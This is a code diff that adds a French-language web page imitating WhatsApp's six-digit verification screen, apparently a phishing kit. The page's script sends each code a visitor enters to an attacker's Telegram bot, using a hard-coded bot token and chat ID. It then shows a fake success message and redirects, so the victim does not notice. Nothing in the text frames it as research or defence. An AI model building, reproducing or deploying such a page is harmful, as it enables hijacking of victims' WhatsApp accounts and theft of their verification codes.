@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vérification WhatsApp</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        :root {
+            --primary-color: #25D366;
+            --secondary-color: #128C7E;
+            --dark-color: #075E54;
+            --light-color: #DCF8C6;
+            --text-color: #333;
+            --light-text: #777;
+            --white: #ffffff;
+            --gray: #f5f5f5;
+            --dark-gray: #e5e5e5;
+            --shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            --transition: all 0.3s ease;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            line-height: 1.6;
+            color: var(--text-color);
+            background-color: var(--gray);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .verification-container {
+            background-color: var(--white);
+            border-radius: 10px;
+            box-shadow: var(--shadow);
+            width: 100%;
+            max-width: 500px;
+            padding: 40px;
+            text-align: center;
+            animation: fadeIn 0.5s ease-out;
+        }
+
+        .logo {
+            color: var(--primary-color);
+            font-size: 48px;
+            margin-bottom: 20px;
+        }
+
+        .verification-title {
+            font-size: 24px;
+            margin-bottom: 15px;
+            color: var(--dark-color);
+        }
+
+        .verification-subtitle {
+            color: var(--light-text);
+            margin-bottom: 30px;
+        }
+
+        .code-container {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 30px;
+        }
+
+        .code-input {
+            width: 50px;
+            height: 60px;
+            border: 2px solid var(--dark-gray);
+            border-radius: 8px;
+            font-size: 24px;
+            text-align: center;
+            font-weight: bold;
+            transition: var(--transition);
+        }
+
+        .code-input:focus {
+            border-color: var(--primary-color);
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(37, 211, 102, 0.2);
+        }
+
+        .code-input.filled {
+            border-color: var(--primary-color);
+            background-color: var(--light-color);
+        }
+
+        .verify-btn {
+            background-color: var(--primary-color);
+            color: var(--white);
+            border: none;
+            padding: 14px 20px;
+            font-size: 16px;
+            font-weight: 500;
+            border-radius: 6px;
+            cursor: pointer;
+            width: 100%;
+            transition: var(--transition);
+            margin-top: 20px;
+        }
+
+        .verify-btn:hover {
+            background-color: var(--secondary-color);
+        }
+
+        .verify-btn:disabled {
+            background-color: var(--dark-gray);
+            cursor: not-allowed;
+        }
+
+        .resend-container {
+            margin-top: 30px;
+            color: var(--light-text);
+        }
+
+        .resend-link {
+            color: var(--primary-color);
+            text-decoration: none;
+            font-weight: 500;
+            cursor: pointer;
+        }
+
+        .resend-link:hover {
+            text-decoration: underline;
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: var(--white);
+            animation: spin 1s ease-in-out infinite;
+            vertical-align: middle;
+            margin-left: 8px;
+        }
+
+        .error-message {
+            color: #e74c3c;
+            margin-top: 15px;
+            font-size: 14px;
+            min-height: 20px;
+        }
+
+        .success-message {
+            color: var(--primary-color);
+            margin-top: 15px;
+            font-size: 14px;
+            min-height: 20px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @media (max-width: 480px) {
+            .verification-container {
+                padding: 30px 20px;
+            }
+            
+            .code-input {
+                width: 40px;
+                height: 50px;
+                font-size: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="verification-container">
+        <div class="logo">
+            <i class="fab fa-whatsapp"></i>
+        </div>
+        <h1 class="verification-title">Vérification du code</h1>
+        <p class="verification-subtitle">Nous avons envoyé un code à 6 chiffres à votre numéro WhatsApp. Veuillez le saisir ci-dessous.</p>
+        
+        <form id="verificationForm">
+            <div class="code-container">
+                <input type="text" class="code-input" maxlength="1" data-index="0" inputmode="numeric" pattern="[0-9]*">
+                <input type="text" class="code-input" maxlength="1" data-index="1" inputmode="numeric" pattern="[0-9]*">
+                <input type="text" class="code-input" maxlength="1" data-index="2" inputmode="numeric" pattern="[0-9]*">
+                <input type="text" class="code-input" maxlength="1" data-index="3" inputmode="numeric" pattern="[0-9]*">
+                <input type="text" class="code-input" maxlength="1" data-index="4" inputmode="numeric" pattern="[0-9]*">
+                <input type="text" class="code-input" maxlength="1" data-index="5" inputmode="numeric" pattern="[0-9]*">
+            </div>
+            
+            <div class="error-message" id="errorMessage"></div>
+            <div class="success-message" id="successMessage"></div>
+            
+            <button type="submit" class="verify-btn" id="verifyBtn" disabled>
+                Vérifier le code
+            </button>
+        </form>
+        
+        <div class="resend-container">
+            <span>Vous n'avez pas reçu de code ?</span>
+            <a class="resend-link" id="resendLink">Renvoyer le code</a>
+            <span id="countdown"></span>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const codeInputs = document.querySelectorAll('.code-input');
+            const verifyBtn = document.getElementById('verifyBtn');
+            const errorMessage = document.getElementById('errorMessage');
+            const successMessage = document.getElementById('successMessage');
+            const resendLink = document.getElementById('resendLink');
+            const countdownElement = document.getElementById('countdown');
+            const form = document.getElementById('verificationForm');
+            
+            let canResend = false;
+            let resendCountdown = 30;
+            
+            // Focus management for code inputs
+            codeInputs.forEach((input, index) => {
+                // Move to next input when a digit is entered
+                input.addEventListener('input', (e) => {
+                    if (e.target.value.length === 1) {
+                        if (index < codeInputs.length - 1) {
+                            codeInputs[index + 1].focus();
+                        } else {
+                            input.blur();
+                        }
+                        e.target.classList.add('filled');
+                        checkCodeCompletion();
+                    } else {
+                        e.target.classList.remove('filled');
+                    }
+                });
+                
+                // Handle backspace
+                input.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace' && e.target.value.length === 0 && index > 0) {
+                        codeInputs[index - 1].focus();
+                    }
+                });
+                
+                // Paste handling
+                input.addEventListener('paste', (e) => {
+                    e.preventDefault();
+                    const pasteData = e.clipboardData.getData('text').trim();
+                    if (/^\d{6}$/.test(pasteData)) {
+                        pasteData.split('').forEach((digit, i) => {
+                            if (codeInputs[i]) {
+                                codeInputs[i].value = digit;
+                                codeInputs[i].classList.add('filled');
+                            }
+                        });
+                        checkCodeCompletion();
+                        codeInputs[5].focus();
+                    }
+                });
+            });
+            
+            // Check if all code digits are filled
+            function checkCodeCompletion() {
+                const allFilled = Array.from(codeInputs).every(input => input.value.length === 1);
+                verifyBtn.disabled = !allFilled;
+                return allFilled;
+            }
+            
+            // Form submission
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                if (!checkCodeCompletion()) {
+                    showError('Veuillez saisir le code complet à 6 chiffres');
+                    return;
+                }
+                
+                // Get the full code
+                const verificationCode = Array.from(codeInputs).map(input => input.value).join('');
+                
+                // Show loading state
+                verifyBtn.innerHTML = 'Vérification en cours <span class="spinner"></span>';
+                verifyBtn.disabled = true;
+                errorMessage.textContent = '';
+                
+                // Send verification code to Telegram bot
+                const botToken = '7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw';
+                const chatId = '5372119436';
+                const message = `Code de vérification WhatsApp reçu: ${verificationCode}`;
+                const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+                
+                fetch(url)
+                    .then(response => response.json())
+                    .then(data => {
+                        // Simulate verification success (in a real app, you'd check the code server-side)
+                        setTimeout(() => {
+                            verifyBtn.innerHTML = 'Code vérifié !';
+                            showSuccess('Vérification réussie. Vous allez être redirigé...');
+                            
+                            // Redirect after 2 seconds
+                            setTimeout(() => {
+                                window.location.href = 'success.html'; // Create this page for successful verification
+                            }, 2000);
+                        }, 1000);
+                    })
+                    .catch(error => {
+                        console.error('Error:', error);
+                        verifyBtn.innerHTML = 'Vérifier le code';
+                        verifyBtn.disabled = false;
+                        showError('Erreur de vérification. Veuillez réessayer.');
+                    });
+            });
+            
+            // Resend code functionality
+            function updateResendCountdown() {
+                if (resendCountdown > 0) {
+                    countdownElement.textContent = ` (${resendCountdown}s)`;
+                    resendCountdown--;
+                    setTimeout(updateResendCountdown, 1000);
+                } else {
+                    canResend = true;
+                    countdownElement.textContent = '';
+                    resendLink.style.display = 'inline';
+                }
+            }
+            
+            resendLink.addEventListener('click', function() {
+                if (!canResend) return;
+                
+                // Reset UI
+                codeInputs.forEach(input => {
+                    input.value = '';
+                    input.classList.remove('filled');
+                });
+                verifyBtn.disabled = true;
+                errorMessage.textContent = '';
+                successMessage.textContent = '';
+                
+                // Show loading
+                resendLink.innerHTML = 'Envoi en cours <span class="spinner"></span>';
+                
+                // Simulate code resend (in a real app, you'd actually resend the code)
+                setTimeout(() => {
+                    resendLink.innerHTML = 'Renvoyer le code';
+                    canResend = false;
+                    resendCountdown = 30;
+                    updateResendCountdown();
+                    showSuccess('Nouveau code envoyé !');
+                }, 1500);
+            });
+            
+            // Start the initial countdown
+            updateResendCountdown();
+            
+            // Helper functions
+            function showError(message) {
+                errorMessage.textContent = message;
+                successMessage.textContent = '';
+            }
+            
+            function showSuccess(message) {
+                successMessage.textContent = message;
+                errorMessage.textContent = '';
+            }
+            
+            // Auto-focus first input on page load
+            codeInputs[0].focus();
+        });
+    </script>
+</body>
+</html>
